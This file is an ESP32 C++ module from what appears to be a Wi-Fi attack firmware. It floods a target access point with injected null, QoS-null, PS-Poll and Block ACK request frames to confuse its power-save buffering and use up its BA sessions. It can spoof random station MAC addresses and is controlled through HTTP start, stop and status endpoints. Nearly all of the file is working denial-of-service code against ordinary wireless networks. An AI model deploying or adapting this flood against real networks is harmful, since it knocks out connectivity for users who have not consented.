#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// Null/QoS-Null power-save confusion flood.
// Sends null data frames with Power Management bit toggling to confuse
// AP's power-save buffering state machine. Combined with PS-Poll floods
// to drain the AP's queue and confuse buffered-frame delivery.
// Also sends Block ACK request (BAR) frames to exhaust BA sessions.
static bool nf2_running = false;
static uint8_t nf2_ap[6]  = {};
static uint8_t nf2_sta[6] = {};
static uint8_t nf2_ch = 6;
static bool    nf2_bcast = true;
static uint8_t nf2_mode = 0; // 0=null+qos, 1=pspoll, 2=bar, 3=all
static volatile uint32_t nf2_sent = 0;
static TaskHandle_t nf2_task = nullptr;

static void nf2_run(void*) {
  uint8_t f[32]; uint8_t sta[6];
  nf2_sent = 0;
  uint8_t pm_toggle = 0;
  while (nf2_running) {
    if (!safety_rate_ok(1)) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }
    if (nf2_bcast) {
      for (int k = 0; k < 6; k++) sta[k] = esp_random() & 0xFF;
      sta[0] = (sta[0] & 0xFE) | 0x02;
    } else {
      memcpy(sta, nf2_sta, 6);
    }
    if (nf2_mode == 0 || nf2_mode == 3) {
      // Null data with PM bit alternating (causes AP to buffer/flush)
      size_t n = f_nullData(f, sta, nf2_ap);
      f[1] = (uint8_t)(0x01 | (pm_toggle ? 0x10 : 0x00)); // PM bit in FC1
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); nf2_sent++;
      n = f_qosNull(f, sta, nf2_ap);
      f[1] = (uint8_t)(0x01 | (pm_toggle ? 0x10 : 0x00));
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); nf2_sent++;
      pm_toggle ^= 1;
    }
    if (nf2_mode == 1 || nf2_mode == 3) {
      size_t n = f_pspoll(f, sta, nf2_ap);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); nf2_sent++;
    }
    if (nf2_mode == 2 || nf2_mode == 3) {
      size_t n = f_bar(f, nf2_ap, sta);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); nf2_sent++;
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  nf2_task = nullptr; vTaskDelete(nullptr);
}

static bool nf2_start(const String& q) {
  int i; String bs, ss, ch, mo, bc;
  if ((i = q.indexOf("bssid="))    >= 0) { int e=q.indexOf('&',i); bs=q.substring(i+6,e<0?q.length():e); }
  if ((i = q.indexOf("sta="))      >= 0) { int e=q.indexOf('&',i); ss=q.substring(i+4,e<0?q.length():e); }
  if ((i = q.indexOf("ch="))       >= 0) { int e=q.indexOf('&',i); ch=q.substring(i+3,e<0?q.length():e); }
  if ((i = q.indexOf("mode="))     >= 0) { int e=q.indexOf('&',i); mo=q.substring(i+5,e<0?q.length():e); }
  if ((i = q.indexOf("broadcast="))>= 0) { int e=q.indexOf('&',i); bc=q.substring(i+10,e<0?q.length():e); }
  if (bs.length() != 17) return false;
  sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x",
    (unsigned*)&nf2_ap[0],(unsigned*)&nf2_ap[1],(unsigned*)&nf2_ap[2],
    (unsigned*)&nf2_ap[3],(unsigned*)&nf2_ap[4],(unsigned*)&nf2_ap[5]);
  if (ss.length() == 17)
    sscanf(ss.c_str(), "%x:%x:%x:%x:%x:%x",
      (unsigned*)&nf2_sta[0],(unsigned*)&nf2_sta[1],(unsigned*)&nf2_sta[2],
      (unsigned*)&nf2_sta[3],(unsigned*)&nf2_sta[4],(unsigned*)&nf2_sta[5]);
  nf2_ch = ch.toInt(); if (!nf2_ch) nf2_ch = 6;
  nf2_bcast = (bc != "0");
  if      (mo == "pspoll") nf2_mode = 1;
  else if (mo == "bar")    nf2_mode = 2;
  else if (mo == "all")    nf2_mode = 3;
  else                     nf2_mode = 0;
  esp_wifi_set_channel(nf2_ch, WIFI_SECOND_CHAN_NONE);
  nf2_running = true;
  xTaskCreate(nf2_run, "nf2_run", 4096, nullptr, 5, &nf2_task);
  return true;
}
static void nf2_stop() { nf2_running = false; }
static void nf2_routes() {
  extern WebServer server;
  server.on("/api/nullflood/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("nullflood", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/nullflood/stop", HTTP_POST, [](){
    tool_stop("nullflood"); server.send(200,"application/json","{\"ok\":1}");
  });
  server.on("/api/nullflood/status", HTTP_GET, [](){
    server.send(200,"application/json",
      "{\"running\":"+String(nf2_running?1:0)+
      ",\"sent\":"+String(nf2_sent)+
      ",\"msg\":\""+String(nf2_sent)+" null/PS frames\"}");
  });
}
